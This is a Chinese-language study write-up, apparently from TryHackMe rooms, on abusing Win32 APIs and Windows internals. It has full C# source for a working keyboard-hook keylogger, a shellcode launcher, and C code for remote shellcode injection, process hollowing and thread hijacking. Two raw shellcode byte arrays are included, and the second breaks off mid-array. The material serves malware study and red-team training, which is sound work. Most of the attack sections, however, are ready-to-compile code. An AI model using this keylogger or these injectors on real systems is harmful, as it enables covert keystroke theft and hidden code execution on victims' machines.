目录中放置一个临时文件，并使用 csc.exe 编译所需的函数。下面是该函数的使用示例。 1$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#39;Kernel32&#39; -NameSpace &#39;Win32&#39; -PassThru; 现在就能用如下的语法调用这个 API： 1[Win32.Kernel32]::&lt;Imported Call&gt;() 这个 PowerShell 和 NET 在之后的学习中会用到很多次，注意给的 demo 的区别是 PowerShell 代码通常含有 $。 常用滥用 APIWin32 库中的一些 API 调用很容易被恶意活动利用。SANs 和 MalAPI.io 在内的多个组织记录和整理了所有具有恶意的可用 API 调用。下面是一些常用滥用 API 的名字和作用： API Call Explanation LoadLibraryA 将指定的 DLL 加载到调用进程的虚拟地址空间中 GetUserNameA 检索与当前线程关联的用户名称 GetComputerNameA 检索本地计算机的 NetBIOS 或 DNS 名称 GetVersionExA 获取当前运行操作系统的版本信息 GetModuleFileNameA 检索指定模块（DLL 或 EXE）的完整路径 GetStartupInfoA 获取当前进程的启动信息 GetModuleHandle 如果指定的模块已被加载到当前进程的地址空间，则返回该模块的句柄 GetProcAddress 返回指定 DLL 中导出函数的地址 VirtualProtect 更改调用进程虚拟地址空间中某段内存的保护属性 案例学习现在我们已经了解了 Win32 库和常用滥用 API 调用的底层实现，接下来让我们分析两个恶意软件样本，并观察它们的调用如何交互。 键盘记录器由于键盘记录器是用 C#编写的，它必须使用 P&#x2F;Invoke 来获取每个调用的指针。下面是恶意软件样本源代码的 P&#x2F;Invoke 定义片段。 1234567891011121314// 将一个钩子过程（Hook Procedure）安装到 Windows 系统中的一个钩子链上 [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); // 从 Hook 链中移除 Hook [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk); // 如果指定的模块已映射到调用进程的地址空间中，则返回该模块的句柄 [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName); private static int WHKEYBOARDLL = 13; // 返回一个伪句柄 [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetCurrentProcess(); 下面是这个样本中 Hook 的片段 123456789101112131415161718192021public static void Main() { // _proc 是一个回调函数，当有键盘事件发生时，Windows 会调用这个函数 // 如果钩子安装成功，SetHook 函数会返回一个钩子句柄，并存储在 _hookID 中 _hookID = SetHook(_proc); // 这是 C# 应用程序的消息循环 // 启动一个循环，等待和处理各种事件（如键盘事件、鼠标事件、窗口消息等） Application.Run(); // 当程序退出消息循环时（比如用户关闭了窗口），会调用这个函数 // 它卸载之前安装的钩子，否则钩子会一直留在内存中，导致资源泄漏 UnhookWindowsHookEx(_hookID); // 退出应用程序 Application.Exit(); } private static IntPtr SetHook(LowLevelKeyboardProc proc) { // 这行代码获取当前正在运行的进程。using 关键字确保 curProcess 对象在使用后会被正确地释放 using (Process curProcess = Process.GetCurrentProcess()) { // 低级键盘钩子 // 返回一个钩子句柄 return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0); } } 参考：Using Hooks 键盘记录器 Demo这是我写的一个键盘记录器 Demo。 总体的过程是创建一个进程，然后给这个进程上一个全局的低级键盘钩子，让每次按键执行的时候都会触发我们的回调函数，回调函数记录并且写入按键到硬盘。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Windows.Forms; public class Program { // 定义一个静态字段来存储钩子句柄 private static IntPtr _hookID = IntPtr.Zero; // 定义一个委托，用于处理键盘事件的回调函数 private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam); // 实例化 LowLevelKeyboardProc 委托，并指向我们自己的钩子回调函数 private static LowLevelKeyboardProc _proc = HookCallback; // 这是 Windows API 函数的 P/Invoke 声明 [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk); [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName); // 键盘钩子类型，表示低级键盘钩子 private static int WH_KEYBOARD_LL = 13; // 键盘消息常量 // WM_KEYDOWN: 普通按键被按下时发送的消息 private const int WM_KEYDOWN = 0x0100; // WM_SYSKEYDOWN: 系统按键被按下时发送的消息（例如 ALT+TAB, F10 等） private const int WM_SYSKEYDOWN = 0x0104; // 全局写入器 private static StreamWriter logWriter; // 程序的入口点，也是核心逻辑所在 public static void Main() { // 在程序启动时，打开一个文件用于写入日志 logWriter = new StreamWriter(&quot;keystrokes.log&quot;, true); _hookID = SetHook(_proc); Application.Run(); UnhookWindowsHookEx(_hookID); // 在程序退出时，关闭文件 logWriter.Close(); Application.Exit(); } // 安装钩子的方法 private static IntPtr SetHook(LowLevelKeyboardProc proc) { using (Process curProcess = Process.GetCurrentProcess()) using (ProcessModule curModule = curProcess.MainModule) { // SetWindowsHookEx 函数将我们的回调函数注册为钩子 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0); } } // 钩子的回调函数，当有键盘事件发生时，Windows 会调用此函数 private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) { // 如果 nCode 小于 0，不处理消息 if (nCode &gt;= 0) { // 检查按键是否被按下 if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) { // 获取虚拟键码 int vkCode = Marshal.ReadInt32(lParam); // 将虚拟键码转换为 C# 的 Keys 枚举 Keys key = (Keys)vkCode; // 判断按键是否是字母 if (key &gt;= Keys.A &amp;&amp; key &lt;= Keys.Z) { // 如果是字母，转换为小写并直接写入文件，不换行 logWriter.Write(key.ToString().ToLower()); } else { // 如果是其他按键，将按键名称（用 [] 括起来）写入文件并换行 logWriter.WriteLine($&quot; [{key.ToString()}]&quot;); } // 确保内容立即写入文件，防止数据丢失 logWriter.Flush(); } } return CallNextHookEx(_hookID, nCode, wParam, lParam); } // 将消息传递给 Hook 链中的下一个钩子 [DllImport(&quot;user32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam); } Shellcode LauncherShellcode 加载器的 P&#x2F;Invoke 过程： 1234567891011private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(&quot;kernel32&quot;)] // 调用进程的虚拟地址空间中分配、保留或提交内存区域 private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(&quot;kernel32&quot;)] // 等待一个内核对象，直到该对象进入有信号状态或者指定的超时时间已到 private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); [DllImport(&quot;kernel32&quot;)] // 在当前进程的虚拟地址空间内创建一个新的线程来执行一个指定的函数 private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); Shellcode 加载器的具体过程： 1234567891011121314151617181920212223// 1分配一个可以容纳 shellcode 大小的内存区域，并且立即提交并且赋予可执行和读写权限 UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 把 shellcode 复制到这个内存区域 Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); // 2初始化句柄，线程 ID，线程参数 IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; // 指向线程参数的指针，这里为空 // 也可以在下面的那个调用里面直接传一个 IntPtr.Zero // 但是上面两个是必须的，函数创建之后会把线程句柄和线程 ID 写回 IntPtr pinfo = IntPtr.Zero; // 3创建一个新线程来执行 shellcode // CreateThread 是一个 Win32 API 函数，它在新线程中执行一个函数（这里是我们的 shellcode） // 参数依次为：线程安全属性、栈大小、线程起始地址、线程参数、创建标志、线程 ID hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); // 4等待线程执行完成 // WaitForSingleObject 是一个 Win32 API 函数，用于等待一个对象（这里是我们的线程）进入有信号状态或超时 // 0xFFFFFFFF 代表无限等待，直到线程执行完毕 WaitForSingleObject(hThread, 0xFFFFFFFF); return; Abusing Windows Internals“Windows 内部”一词可涵盖 Windows 操作系统后端的所有组件。这包括进程、文件格式、COM（组件对象模型）、任务调度、I&#x2F;O 系统等。本房间将重点介绍如何滥用和利用进程及其组件、DLL（动态链接库）和 PE（可执行文件）格式。 Abusing Processes 滥用进程一个应用程序可以包含一个或者多个进程，而一个进程有多个子组件，他们可以直接和内存或虚拟内存交互，下面是每个进程的关键组件和用途，前面的 Windows Internals 房间我已经介绍过了，这里直接复制过来了。 进程组件 作用 私有虚拟内存空间 分配给进程的虚拟内存地址 可执行程序 定义存储在虚拟内存空间中的代码和数据 打开的句柄 定义进程可访问的系统资源的句柄 安全上下文 访问令牌定义了用户， 安全组，权限和其他安全信息 进程 ID 每个进程独有的数字标识符 线程 进程计划执行的部分 进程注入通常是一个总括性术语，用于描述通过合法功能或组件将恶意代码注入进程。在本房间中，我们将重点关注以下四种不同类型的进程注入。 Injection Type Function Process Hollowing 进程挖空 把代码注入进暂停并且挖空的进程中 Thread Execution Hijacking 线程执行劫持 把代码注入进暂停的线程中 Dynamic-link Library Injection 动态链接库注入 把 DLL 注入进正在运行的进程中 Portable Executable Injection 可执行文件注入 将指向恶意函数的 PE 镜像自注入到目标进程中 MITRE T1055 中概述了许多其他形式的进程注入。 最基本的进程注入形式是 shellcode 注入，可以分为四个步骤： 以所有访问权限打开目标进程。 为 shellcode 分配目标进程内存。 将 shellcode 写入目标进程中已分配的内存。 使用远程线程执行 shellcode。 这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。 这里会分解一个 Shellcode 注入器的执行过程，这里和我们之前玩的注入一个弹窗是一样的。 第一步，用 OpenProcess 打开目标进程： 12345processHandle = OpenProcess( PROCESS_ALL_ACCESS, // Defines access rights FALSE, // Target handle will not be inhereted DWORD(atoi(argv[1])) // Local process supplied by command-line arguments ); 第二步，分配内存： 1234567remoteBuffer = VirtualAllocEx( processHandle, // Opened target process NULL, sizeof shellcode, // Region size of memory allocation (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages ); 第三步，写入 shellcode 到分配好的内存区域中： 1234567WriteProcessMemory( processHandle, // Opened target process remoteBuffer, // Allocated memory region shellcode, // Data to write sizeof shellcode, // byte size of data NULL ); 第四步，用 CreateRemoteThread 执行： 123456789remoteThread = CreateRemoteThread( processHandle, // Opened target process NULL, 0, // Default size of the stack (LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread NULL, 0, // Ran immediately after creation NULL ); 远程代码注入实战这里的 Shellcode 是弹计算器的，执行会被卡巴拦未授权的注入。 .rgczuhnqzhsk{zoom:33%;} 12345678910111213141516171819202122232425262728#include &lt;windows.h&gt; #include &lt;stdio.h&gt; unsigned char shellcode[] = { 0xdb, 0xc5, 0xd9, 0x74, 0x24, 0xf4, 0x5d, 0xb8, 0xd7, 0x4d, 0x78, 0xab, 0x2b, 0xc9, 0xb1, 0x30, 0x31, 0x45, 0x18, 0x83, 0xc5, 0x04, 0x03, 0x45, 0xc3, 0xaf, 0x8d, 0x57, 0x03, 0xad, 0x6e, 0xa8, 0xd3, 0xd2, 0xe7, 0x4d, 0xe2, 0xd2, 0x9c, 0x06, 0x54, 0xe3, 0xd7, 0x4b, 0x58, 0x88, 0xba, 0x7f, 0xeb, 0xfc, 0x12, 0x8f, 0x5c, 0x4a, 0x45, 0xbe, 0x5d, 0xe7, 0xb5, 0xa1, 0xdd, 0xfa, 0xe9, 0x01, 0xdc, 0x34, 0xfc, 0x40, 0x19, 0x28, 0x0d, 0x10, 0xf2, 0x26, 0xa0, 0x85, 0x77, 0x72, 0x79, 0x2d, 0xcb, 0x92, 0xf9, 0xd2, 0x9b, 0x95, 0x28, 0x45, 0x90, 0xcf, 0xea, 0x67, 0x75, 0x64, 0xa3, 0x7f, 0x9a, 0x41, 0x7d, 0x0b, 0x68, 0x3d, 0x7c, 0xdd, 0xa1, 0xbe, 0xd3, 0x20, 0x0e, 0x4d, 0x2d, 0x64, 0xa8, 0xae, 0x58, 0x9c, 0xcb, 0x53, 0x5b, 0x5b, 0xb6, 0x8f, 0xee, 0x78, 0x10, 0x5b, 0x48, 0xa5, 0xa1, 0x88, 0x0f, 0x2e, 0xad, 0x65, 0x5b, 0x68, 0xb1, 0x78, 0x88, 0x02, 0xcd, 0xf1, 0x2f, 0xc5, 0x44, 0x41, 0x14, 0xc1, 0x0d, 0x11, 0x35, 0x50, 0xeb, 0xf4, 0x4a, 0x82, 0x54, 0xa8, 0xee, 0xc8, 0x78, 0xbd, 0x82, 0x92, 0x16, 0x40, 0x10, 0xa9, 0x54, 0x42, 0x2a, 0xb2, 0xc8, 0x2b, 0x1b, 0x39, 0x87, 0x2c, 0xa4, 0xe8, 0xec, 0xc3, 0xee, 0xb1, 0x44, 0x4c, 0xb7, 0x23, 0xd5, 0x11, 0x48, 0x9e, 0x19, 0x2c, 0xcb, 0x2b, 0xe1, 0xcb, 0xd3, 0x59, 0xe4, 0x90, 0x53, 0xb1, 0x94, 0x89, 0x31, 0xb5, 0x0b, 0xa9, 0x13, 0xd6, 0xca, 0x39, 0xff, 0x19 }; int main(int argc, char* argv[]) { HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1]))); PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL); HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL); } Process Hollowing 进程挖空进程挖空（Process Hollowing），或称为“空心化”，是一种常见的恶意软件技术。它的核心思想就是： 创建外壳：创建一个合法的、看似无害的进程（比如 notepad.exe）。但关键在于，这个进程被创建时是暂停的。 清空外壳：利用暂停状态，攻击者可以清空这个合法进程的内存空间。 注入恶意代码：将恶意代码（payload）注入到这个被清空的内存空间中。 恢复执行：恢复进程的执行，此时，这个合法进程实际上执行的是注入的恶意代码。 这些步骤也可以用图表形式分解，以描绘 Windows API 调用如何与进程内存交互。 接下来会讲解一个基本的进程镂空注入器： 第一步：创建挂起进程我们必须使用 CreateProcessA 创建一个处于挂起状态的目标进程。并传入 STARTUPINFOA 和 PROCESS_INFORMATION 结构体，来创建并获取目标进程的启动信息和句柄。 CreateProcessA function (processthreadsapi.h) - Win32 apps 123456789101112131415161718192021// STARTUPINFOA 是一个结构体，它包含新进程的启动信息，比如窗口大小、位置、标准输入/输出句柄等 LPSTARTUA target_si = new STARTUPINFOA(); // 包含进程和主线程的信息 // PROCESS_INFORMATION 是一个结构体，这里会接收 CreateProcessA 函数返回的新创建的进程和其主线程的句柄和 ID LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // 上下文结构体指针 CONTEXT c; if (CreateProcessA( (LPSTR)&quot;C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe&quot;, // 要执行的程序名称 NULL, // 命令行参数 NULL, // 进程安全属性 NULL, // 线程安全属性 TRUE, // 句柄从调用进程继承 CREATE_SUSPENDED, // 新进程处于暂停状态 NULL, // 环境变量 NULL 表示使用默认值 NULL, // 当前目录 NULL 表示使用默认值 target_si, // 指向启动信息结构体的指针 target_pi) == 0) { // 指向进程信息结构体的指针 cout &lt;&lt; &quot;[!] Failed to create Target process. Last Error: &quot; &lt;&lt; GetLastError(); return 1; 第二步：读取恶意镜像到本地内存我们需要打开一个恶意镜像进行注入，首先使用 CreateFileA 获取恶意镜像的句柄。 CreateFileA function (fileapi.h) - Win32 apps 12345678910// 被打开文件的句柄 HANDLE hMaliciousCode = CreateFileA( (LPCSTR)&quot;C:\\\\\\\\Users\\\\\\\\tryhackme\\\\\\\\malware.exe&quot;, // 要打开的文件的路径 GENERIC_READ, // 只读访问 FILE_SHARE_READ, // 只读共享模式，FILE_SHARE_READ 意味着其他进程也可以打开这个文件来读取，但不能写入 NULL, // 使用默认的安全设置 OPEN_EXISTING, // 指示函数如果文件或设备存在就打开它 NULL, // 模板文件 NULL // 文件属性 ); 一旦获得恶意镜像的句柄，就使用 GetFileSize 获取其大小，然后用 VirtualAlloc 为当前进程分配一个足够存储整个文件的内存块。 GetFileSize function VirtualAlloc function 1234567891011DWORD maliciousFileSize = GetFileSize( hMaliciousCode, // 被打开文件的句柄 0 // 打开 4GB 以下文件 ); PVOID pMaliciousImage = VirtualAlloc( NULL, maliciousFileSize, // 文件大小 0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT) 0x04 // Enables read/write access (PAGE_READWRITE) ); 现在内存已分配给本地进程，必须对其进行写入。利用从先前步骤中获得的信息，我们可以使用 ReadFile 将数据写入本地进程内存。 123456789101112131415DWORD numberOfBytesRead; // 存储读取的字节数 if (!ReadFile( hMaliciousCode, // 被打开文件的句柄 pMaliciousImage, // 分配好的内存区域 maliciousFileSize, // 文件大小 &amp;numberOfBytesRead, // 读取的字节数 NULL )) { cout &lt;&lt; &quot;[!] Unable to read Malicious file into memory. Error: &quot; &lt;&lt;GetLastError()&lt;&lt; endl; TerminateProcess(target_pi-&gt;hProcess, 0); return 1; } CloseHandle(hMaliciousCode); 第三步：掏空目标进程我们需要“掏空”目标进程的内存，我们必须找到进程的基址和入口点。 为了找到这些信息，我们首先要获取主线程的上下文（Context）。在 32 位系统上，GetThreadContext 函数能让我们访问线程暂停时的所有寄存器状态。在线程创建并挂起后，EBX 寄存器会指向进程环境块（PEB），而 EAX 则包含了原始程序的入口点 一旦获取了 EBX 的值，我们使用 ReadProcessMemory 函数，从 EBX 指向的地址加上 0x8（对于 32 位系统）或 0x10（对于 64 位系统）的固定偏移量来读取进程的原始镜像基址。 ReadProcessMemory function (memoryapi.h) - Win32 apps 123456789101112131415161718192021// 只在指针中存储 CPU 寄存器 // CONTEXT_INTEGER 是一个标志，它告诉 GetThreadContext 函数，你只关心线程的整数寄存器（如 Eax、Ebx 等），而不需要浮点寄存器或其他信息。这能减少开销，并获得你所需的数据。 c.ContextFlags = CONTEXT_INTEGER; // 获取当前线程上下文 GetThreadContext( target_pi-&gt;hThread, // 从 PROCESS_INFORMATION 结构体中获取 线程 句柄 &amp;c // GetThreadContext 函数会将该线程的当前寄存器状态写入这个结构体 ); // 存储从目标进程读取的基址 PVOID pTargetImageBaseAddress; // 读取进程内存 ReadProcessMemory( target_pi-&gt;hProcess, // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄 (PVOID)(c.Ebx + 8), // 进程的基址 &amp;pTargetImageBaseAddress, // 存储基址到这个变量 sizeof(PVOID), // 要读取的字节数 0 // 读取的字节数，这里用 NULL 代替，表示不关心 ); 获取进程的基址后，我们就可以开始取消映射内存了。我们可以从 ntdll.dll 导入 ZwUnmapViewOfSection API 来释放目标进程的内存。 12345678910111213HMODULE hNtdllBase = GetModuleHandleA(&quot;ntdll.dll&quot;); // 获取 ntdll 的句柄 // 从 ntdll 里面获取 ZwUnmapViewOfSection API pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress( hNtdllBase, // ntdll 的句柄 &quot;ZwUnmapViewOfSection&quot; // 要获取的 API 函数 ); // 存储执行 ZwUnmapViewOfSection 的结果，也就是掏空成功与否 DWORD dwResult = pZwUnmapViewOfSection( target_pi-&gt;hProcess, // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄 pTargetImageBaseAddress // 要掏空的进程的基址 ); 第四步：重新分配并写入恶意代码第四步，我们需要在目标进程中重新分配内存，但这回分配的大小不是原文件的大小，而是恶意代码镜像在内存中所需的大小。 为了获取这个精确的尺寸，我们必须解析恶意可执行文件（PE 文件）的头部。 首先，通过 e_lfanew 字段，我们可以找到从 DOS 头部到 PE 头部的字节偏移量。 接着，一旦定位到 PE 头部，我们就可以从可选头部中读取 SizeOfImage 字段。 过程简述：获取 DOS 头部 -&gt; 从 DOS 头部中获取 e_lfanew -&gt; 定位到 NT 头部 -&gt; NT 头部中找到可选头部 -&gt; 找到 SizeOfImage 12345678910111213141516171819202122// 从恶意镜像中获取 DOS 头部 // 将 pMaliciousImage 强制类型转换为 PIMAGE_DOS_HEADER // 使其能作为指针来访问 PE 文件的 DOS 头部 PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage; // PE 文件的核心是 NT 头部，e_lfanew 存储了从文件开头到 NT 头部起始位置的偏移量，而 e_lfanew 是在 DOS 头部中的 // 这里利用这个偏移量，计算出 NT 头部在内存中的确切位置 PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew); // 从 NT 头部结构体中获取可选头部的大小 // SizeOfImage 定义了可执行文件加载到内存所需的总大小 DWORD sizeOfMaliciousImage = pNTHeaders-&gt;OptionalHeader.SizeOfImage; // 在目标进程中分配内存 // 返回的是分配好的内存的指针地址 PVOID pHollowAddress = VirtualAllocEx( target_pi-&gt;hProcess, // 目标进程的句柄，从结构体里面拿的 pTargetImageBaseAddress, // 进程的基址 sizeOfMaliciousImage, // 加载到内存所需的总大小 0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT) 0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE) ); 分配好内存后，我们就可以将恶意文件的内存镜像写入目标进程。由于 PE 文件的内存镜像结构，我们必须先将 PE 头部写入新分配的内存空间。在写入 PE 头部时，我们使用 WriteProcessMemory 函数，并指定 PE 头部的大小来确定写入范围。 123456789if (!WriteProcessMemory( target_pi-&gt;hProcess, // 进程句柄 pTargetImageBaseAddress, // 进程基址 pMaliciousImage, // 内存中恶意镜像文件的地址 pNTHeaders-&gt;OptionalHeader.SizeOfHeaders, // PE 头的大小 NULL )) { cout&lt;&lt; &quot;[!] Writting Headers failed. Error: &quot; &lt;&lt; GetLastError() &lt;&lt; endl; } 现在我们需要写入每个节。要查找节的数量，我们可以使用 NT 头中的 NumberOfSections 。我们可以通过循环遍历 e_lfanew 和当前头的大小来写入每个节。 123456789101112131415// 根据 PE 中的分段数进行循环 for (int i = 0; i &lt; pNTHeaders-&gt;FileHeader.NumberOfSections; i++) { // 确定当前的 PE 节头部 强制转换成 PIMAGE_SECTION_HEADER 结构体 // 计算出当前节的头部在恶意文件内存中的精确位置 // DOS 头到 NT 头部的偏移量 + NT 头本身的大小 + 节数 * 节头部的大小 = 要写入的节头部地址 PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); WriteProcessMemory( target_pi-&gt;hProcess, // 进程句柄 (PVOID)((LPBYTE)pHollowAddress + pSectionHeader-&gt;VirtualAddress), // 要写入的目标地址 当前节在内存中的相对地址，这是在节里面定义好的 (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader-&gt;PointerToRawData), // 源地址 当前节在文件中的偏移量 镜像基址 + 当前节数据的偏移量 = 节开始的地址 pSectionHeader-&gt;SizeOfRawData, // 当前节的原始数据大小 NULL // 写入了多少字节 ); } 第五步：修改上下文并恢复线程我们使用 SetThreadContext 将 EAX 更改为指向入口点，最后使用 ResumeThread 将进程从挂起状态中恢复。 12345678910111213// 将挂起线程的 EAX 寄存器修改为恶意镜像的入口点地址。当线程恢复时，它将从这个新的地址开始执行。 // 这里的 c 是上下文结构体 c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint); // 修改线程的上下文 SetThreadContext( target_pi-&gt;hThread, // 线程句柄 &amp;c // 指向存储的上下文结构的指针 ); ResumeThread( target_pi-&gt;hThread // 线程句柄 ); 这样就完成了一个进程空洞注入。 实战靶机里面有一个 demo，这里就不贴代码了。注意要用 32 位环境编译，被注入和注入的程序都要 32 位的，可以自己写一个简单的输入输出模拟一下就 OK 了，我这里是用的一个输出固定字符串的文件来检验我注入是否成功了。 1234567#include &lt;iostream&gt; int main() { std::cout &lt;&lt; &quot;Pwned!\\n&quot;; system(&quot;pause&quot;); } Thread Hijacking 线程劫持这里原标题是 Abusing Process Components ，但是实际讲的是线程执行 线程劫持可分为十个步骤： 定位并打开要控制的目标进程。 为恶意代码分配内存区域。 在分配的内存中编写恶意代码。 确定要劫持的目标线程的线程 ID。 打开目标线程。 暂停目标线程。 获取线程上下文。 更新恶意代码的指令指针。 重写目标线程上下文。 恢复被劫持的线程。 这个技术的前三步和之前讲过的是一样的，获取进程句柄，分配内存，写入 shellcode 进内存。 123HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId); PVOIF remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); 第四步，我们首先使用 CreateToolhelp32Snapshot API 创建一个包含所有线程信息的系统快照。接着，利用 Thread32First 和 Thread32Next 遍历这个快照，找到与目标进程 ID 匹配的线程 ID。找到后，我们使用 OpenThread API 获取这个目标线程的句柄，以便后续操作。 CreateToolhelp32Snapshot function Thread32First function 12345678910111213141516171819202122// 初始化结构体 THREADENTRY32 threadEntry; HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, // 快照系统中的所有线程 0 // 指示当前进程，不过这里会被忽略，返回的所有的进程的快照 ); // 获取快照中的第一个线程 Thread32First( hSnapshot, // 快照的句柄 &amp;threadEntry // 指向 THREADENTRY32 的结构体指针 ); do { if (threadEntry.th32OwnerProcessID == processID) // 匹配进程 ID { // 打开找到进程的线程的句柄 HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID); break; } } while (Thread32Next(hsnapshot, &amp;threadEntry)); 第六步，挂起线程。接着，我们使用 GetThreadContext 获取线程的上下文。在 CONTEXT 结构体中，我们找到并修改指令指针寄存器（在 x64 系统上为 RIP，在 x86 系统上为 EIP），让它指向我们之前注入的 shellcode 的内存地址。最后，用 SetThreadContext 将修改后的上下文写回线程。最后一步让程序继续运行就 OK 了。 12345678910111213141516// 挂起线程 SuspendThread(hThread); // 定义一个 CONTEXT 结构体 CONTEXT context; // 获取线程上下文 GetThreadContext(hThread, &amp;context); // 修改 CONTEXT 结构体变量让 RIP 指向我们分配并且写入好的内存区域 context.Rip = (DWORD_PTR)remoteBuffer; // 设置线程的上下文 SetThreadContext(hThread,&amp;context); // 让线程继续运行 ResumeThread(hThread); 实战这个给的 Demo 就是修改 RIP 的，所以直接劫持 x64 应用就 OK。当然 shellcode 也要换一下，下面是我改好的代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;windows.h&gt; #include &lt;dbghelp.h&gt; #include &lt;tlhelp32.h&gt; #include &lt;stdio.h&gt; unsigned char shellcode[] = &quot;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xde\\xff\\xff\\xff\\x48\\x8d\\x05\\xef&quot; &quot;\\xff\\xff\\xff\\x48\\xbb\\x53\\x60\\x16\\x71\\x23\\x14\\xed\\xcc\\x48&quot; &quot;\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xaf\\x28\\x95&quot; &quot;\\x95\\xd3\\xfc\\x2d\\xcc\\x53\\x60\\x57\\x20\\x62\\x44\\xbf\\x9d\\x05&quot; &quot;\\x28\\x27\\xa3\\x46\\x5c\\x66\\x9e\\x33\\x28\\x9d\\x23\\x3b\\x5c\\x66&quot; &quot;\\x9e\\x73\\x28\\x9d\\x03\\x73\\x5c\\xe2\\x7b\\x19\\x2a\\x5b\\x40\\xea&quot; &quot;\\x5c\\xdc\\x0c\\xff\\x5c\\x77\\x0d\\x21\\x38\\xcd\\x8d\\x92\\xa9\\x1b&quot; &quot;\\x30\\x22\\xd5\\x0f\\x21\\x01\\x21\\x47\\x39\\xa8\\x46\\xcd\\x47\\x11&quot; &quot;\\x5c\\x5e\\x70\\xf3\\x9f\\x6d\\x44\\x53\\x60\\x16\\x39\\xa6\\xd4\\x99&quot; &quot;\\xab\\x1b\\x61\\xc6\\x21\\xa8\\x5c\\xf5\\x88\\xd8\\x20\\x36\\x38\\x22&quot; &quot;\\xc4\\x0e\\x9a\\x1b\\x9f\\xdf\\x30\\xa8\\x20\\x65\\x84\\x52\\xb6\\x5b&quot; &quot;\\x40\\xea\\x5c\\xdc\\x0c\\xff\\x21\\xd7\\xb8\\x2e\\x55\\xec\\x0d\\x6b&quot; 